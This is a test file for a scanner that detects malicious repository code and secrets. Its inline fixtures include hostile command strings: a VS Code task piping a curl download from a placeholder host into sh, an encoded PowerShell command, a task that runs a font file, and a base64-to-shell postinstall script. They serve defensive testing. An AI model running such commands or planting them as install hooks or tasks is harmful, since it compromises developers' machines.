import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { clean, scan } from "../src/index.js";
import { severityRank, type Finding } from "../src/core/types.js";
import { fake, fixture, project } from "./helpers/project.js";

const ids = (fs: Finding[]): string[] => fs.map((f) => f.ruleId);
const hasHigh = (fs: Finding[]): boolean => fs.some((f) => severityRank(f.severity) >= severityRank("high"));

describe("harmless code", () => {
  it("does not flag plain JavaScript or TypeScript", async () => {
    const root = project({
      "src/plain.js": fixture("benign/plain.js.txt"),
      "src/typed.ts": fixture("benign/typed.ts.txt"),
    });
    const r = await scan({ root });
    expect(r.findings).toEqual([]);
    expect(r.safe).toBe(true);
    expect(r.summary.filesScanned).toBe(2);
  });

  it("does not classify harmless eval, base64, fetch, or spawn as confirmed malware", async () => {
    const root = project({ "src/harmless.js": fixture("benign/harmless-uses.js.txt") });
    const r = await scan({ root, mode: "strict" });
    expect(hasHigh(r.findings)).toBe(false);
    expect(ids(r.findings)).not.toContain("RS-EXEC-002");
    expect(ids(r.findings)).not.toContain("RS-DL-001");
    expect(r.safe).toBe(true);
  });

  it("never says a clean repository is proven safe", async () => {
    const r = await scan({ root: project({ "a.js": "export {}" }) });
    expect(r.disclaimer).toMatch(/does not prove/i);
  });
});

describe("suspicious behaviour", () => {
  it("flags VS Code tasks that execute font assets as critical, not ordinary task/font entries", async () => {
    const root = project({
      ".vscode/tasks.json": `{
        // VS Code task config supports comments.
        "version": "2.0.0",
        "tasks": [
          { "label": "build", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-700.otf"] },
          { "label": "copy assets", "type": "shell", "command": "npm run copy-fonts" },
          { "label": "build app", "type": "shell", "command": "node build.js --font public/fonts/fa-regular-400.woff2" }
        ]
      }`,
      "public/fonts/fa-regular-400.woff2": "font fixture, not executable code",
    });
    const report = await scan({ root, includeGitHistory: false });
    const finding = report.findings.find((item) => item.ruleId === "RS-VSC-001");
    expect(finding?.severity).toBe("critical");
    expect(finding?.confidence).toBe("high");
    expect(finding?.file).toBe(".vscode/tasks.json");
    expect(report.findings.filter((item) => item.ruleId === "RS-VSC-001")).toHaveLength(1);
  });

  it("flags VS Code tasks that download and execute or launch encoded commands", async () => {
    const root = project({
      ".vscode/tasks.json": JSON.stringify({
        version: "2.0.0",
        tasks: [
          { label: "remote", type: "shell", command: "curl https://invalid.example/payload | sh" },
          { label: "encoded", type: "shell", command: "powershell -EncodedCommand ZQBjAGgAbwA=" },
        ],
      }),
    });
    const report = await scan({ root, includeGitHistory: false });
    const findings = report.findings.filter((item) => item.ruleId === "RS-VSC-001");
    expect(findings).toHaveLength(2);
    expect(findings.every((item) => item.severity === "critical" && item.confidence === "high")).toBe(true);
  });

  it("only removes suspicious VS Code task entries when clean({ remove: true }) is explicit", async () => {
    const taskFile = `{
      // Keep this unrelated task.
      "version": "2.0.0",
      "tasks": [
        { "label": "bad", "type": "shell", "command": "node", "args": ["./public/fonts/fa-solid-700.otf"] },
        { "label": "good", "type": "shell", "command": "npm run copy-fonts" },
        { "label": "build app", "type": "shell", "command": "node build.js --font public/fonts/fa-solid-700.otf" }
      ]
    }`;
    const root = project({
      ".vscode/tasks.json": taskFile,
      "public/fonts/fa-solid-700.otf": "font fixture, not executable code",
    });
    const tasksPath = path.join(root, ".vscode/tasks.json");

    await clean({ root, includeGitHistory: false });
    expect(fs.readFileSync(tasksPath, "utf8")).toBe(taskFile);

    const report = await clean({ root, includeGitHistory: false, remove: true });
    const updated = fs.readFileSync(tasksPath, "utf8");
    expect(updated).not.toContain('"label": "bad"');
    expect(updated).toContain("npm run copy-fonts");
    expect(updated).toContain("node build.js --font public/fonts/fa-solid-700.otf");
    expect(fs.existsSync(path.join(root, "public/fonts/fa-solid-700.otf"))).toBe(true);
    expect(report.findings.some((item) => item.ruleId === "RS-VSC-001")).toBe(false);
    expect(report.notes.join(" ")).toMatch(/Removed 1 VS Code task entry/);
  });

  it("removes critical npm script entries but preserves unrelated package scripts", async () => {
    const root = project({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: {
          postinstall: "echo aWQ= | base64 -d | sh",
          build: "vite build",
        },
      }),
    });

    const report = await clean({ root, includeGitHistory: false, remove: true });
    const pkg = JSON.parse(fs.readFileSync(path.join(root, "package.json"), "utf8"));
    expect(pkg.scripts.postinstall).toBeUndefined();
    expect(pkg.scripts.build).toBe("vite build");
    expect(report.findings.some((item) => item.ruleId === "RS-PKG-001")).toBe(false);
  });

  it("previews critical source deletion unless clean({ removeSource: true }) is explicit", async () => {
    const source = fixture("malicious/decode-exec.js.txt");
    const root = project({ "src/loader.js": source });
    const file = path.join(root, "src/loader.js");

    const preview = await clean({ root, includeGitHistory: false, remove: true });
    expect(fs.existsSync(file)).toBe(true);
    expect(preview.notes.join(" ")).toContain("src/loader.js");

    const removed = await clean({ root, includeGitHistory: false, remove: true, removeSource: true });
    expect(fs.existsSync(file)).toBe(false);
    expect(removed.findings.some((item) => item.severity === "critical")).toBe(false);
  });

  it("flags a decoded payload that reaches eval as critical", async () => {
    const r = await scan({ root: project({ "src/loader.js": fixture("malicious/decode-exec.js.txt") }) });
    const f = r.findings.find((x) => x.ruleId === "RS-EXEC-002");
    expect(f?.severity).toBe("critical");
    expect(f?.confidence).toBe("high");
    expect(f?.location?.line).toBe(3);
    expect(f?.evidence.join(" ")).toMatch(/decoded/);
    expect(f?.recommendation).toBeTruthy();
    expect(r.safe).toBe(false);
  });

  it("flags the encoded blob statically without executing it", async () => {
    const r = await scan({ root: project({ "src/loader.js": fixture("malicious/decode-exec.js.txt") }) });
    expect(ids(r.findings)).toContain("RS-OBF-002");
  });

  it("flags remote download followed by execution", async () => {
    const r = await scan({ root: project({ "src/dropper.js": fixture("malicious/download-exec.js.txt") }) });
    const f = r.findings.find((x) => x.ruleId === "RS-DL-001");
    expect(f?.severity).toBe("critical");
    expect(f?.evidence.join(" ")).toMatch(/not contacted/);
    expect(r.safe).toBe(false);
  });

  it("flags shell execution that pipes a download into sh", async () => {
    const r = await scan({ root: project({ "src/run.js": fixture("malicious/shell-pipe.js.txt") }) });
    const f = r.findings.find((x) => x.ruleId === "RS-PROC-002");
    expect(f?.severity).toBe("critical");
    expect(f?.message).toMatch(/download piped into a shell/);
  });

  it("flags credential and environment exfiltration", async () => {
    const r = await scan({ root: project({ "src/telemetry.js": fixture("malicious/exfil.js.txt") }) });
    const f = r.findings.find((x) => x.ruleId === "RS-EXFIL-001");
    expect(f).toBeDefined();
    expect(severityRank(f!.severity)).toBeGreaterThanOrEqual(severityRank("high"));
  });

  it("flags obfuscation and hidden module names", async () => {
    const r = await scan({ root: project({ "src/o.js": fixture("malicious/obfuscated.js.txt") }) });
    expect(ids(r.findings)).toEqual(expect.arrayContaining(["RS-OBF-001", "RS-OBF-003"]));
  });

  it("gives more weight to the same construct inside a config file", async () => {
    const body = `const { execSync } = require("child_process");\nexecSync(process.env.BUILD_HOOK);\n`;
    const inApp = await scan({ root: project({ "src/app.js": body }) });
    const inCfg = await scan({ root: project({ "vite.config.js": body }) });
    const a = inApp.findings.find((f) => f.ruleId === "RS-PROC-001");
    const c = inCfg.findings.find((f) => f.ruleId === "RS-PROC-001");
    expect(c!.score).toBeGreaterThan(a!.score);
    expect(c!.scoreFactors.map((x) => x.name)).toContain("sensitive-location");
  });

  it("flags network and process activity at load time in a malicious-looking config", async () => {
    const r = await scan({ root: project({ "vite.config.js": fixture("malicious/vite.config.js.txt") }) });
    expect(ids(r.findings)).toContain("RS-CFG-001");
    expect(r.findings.every((f) => f.file === "vite.config.js")).toBe(true);
  });

  it("does not flag a normal config file", async () => {
    const cfg = `import { defineConfig } from "vite";\nexport default defineConfig({ server: { port: 3000 } });\n`;
    const r = await scan({
      root: project({
        "vite.config.ts": cfg,
        "next.config.js": "module.exports = { reactStrictMode: true };\n",
      }),
    });
    expect(r.findings).toEqual([]);
  });

  it("escalates correlated behaviour classes and explains why", async () => {
    const code = `${fixture("malicious/decode-exec.js.txt")}\n${fixture("malicious/exfil.js.txt")}\n`;
    const r = await scan({ root: project({ "src/all.js": code }) });
    const f = r.findings.find((x) => x.ruleId === "RS-EXFIL-001");
    expect(f?.correlatedWith).toContain("RS-EXEC-002");
    expect(f?.scoreFactors.map((x) => x.name)).toContain("correlated");
  });
});

describe("secrets", () => {
  it("detects secrets, reports location, and never emits the raw value", async () => {
    const gh = fake.github();
    const aws = fake.aws();
    const root = project({
      "src/config.js": `export const a = "${gh}";\nexport const b = "${aws}";\n`,
      "deploy/key.json": `{ "k": "${fake.slack()}" }\n`,
      "certs/id.txt.json": `{ "pem": "${fake.privateKeyHeader()}" }\n`,
    });
    const r = await scan({ root });
    const secrets = r.findings.filter((f) => f.ruleId === "RS-SEC-001");
    expect(secrets.length).toBeGreaterThanOrEqual(4);
    expect(secrets.find((s) => s.file === "src/config.js" && s.location?.line === 1)).toBeDefined();

    for (const text of [
      JSON.stringify(r),
      (await import("../src/index.js")).generateReport(r, { format: "text" }),
      (await import("../src/index.js")).generateReport(r, { format: "sarif" }),
    ]) {
      expect(text).not.toContain(gh);
      expect(text).not.toContain(aws);
      expect(text).not.toContain(gh.slice(4, 30));
    }
    expect(secrets[0]!.evidence.join(" ")).toMatch(/REDACTED/);
  });

  it("ignores obvious placeholders", async () => {
    const root = project({
      "src/c.js": `const key = "your_api_key_here_please_change";\nconst t = process.env.API_TOKEN;\nconst x = "AKIAIOSFODNN7EXAMPLE";\n`,
    });
    const r = await scan({ root });
    expect(r.findings.filter((f) => f.ruleId === "RS-SEC-001")).toEqual([]);
  });
});
